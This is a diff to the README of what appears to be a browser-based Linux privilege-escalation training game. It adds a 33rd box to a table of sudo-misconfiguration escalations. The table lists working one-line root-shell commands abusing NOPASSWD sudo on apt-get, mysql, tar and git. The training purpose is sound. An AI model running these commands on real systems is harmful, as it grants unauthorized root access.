@@ -1,6 +1,6 @@
 # rootQuest — Linux Privilege Escalation Playground
 
-A 100% browser-based, vanilla JS terminal game. 32 independent Linux machines, 32 different privilege-escalation vulnerabilities, sorted into difficulty tiers. Enumerate, identify, exploit, root.
+A 100% browser-based, vanilla JS terminal game. 33 independent Linux machines, 33 different privilege-escalation vulnerabilities, sorted into difficulty tiers. Enumerate, identify, exploit, root.
 
 ## Play
 
@@ -48,6 +48,7 @@ start index.html         # Windows
 | 30 | box-30 | Medium | Sudoers NOPASSWD on `apt-get` — `-o` config-override runs a Pre-Invoke hook as root (GTFOBins) | `sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh` |
 | 31 | box-31 | Medium | Sudoers NOPASSWD on `mysql` — client-builtin `\!` shell escape (GTFOBins) | `sudo mysql -e '\! /bin/sh'` |
 | 32 | box-32 | Medium | Sudoers NOPASSWD on `tar` — `--checkpoint-action=exec` runs a command as root (GTFOBins) | `sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` |
+| 33 | box-33 | Medium | Sudoers NOPASSWD on `git` — `-p` forces a pager that inherits root (GTFOBins) | `sudo git -p help !/bin/sh` |
 
 ## Controls
 
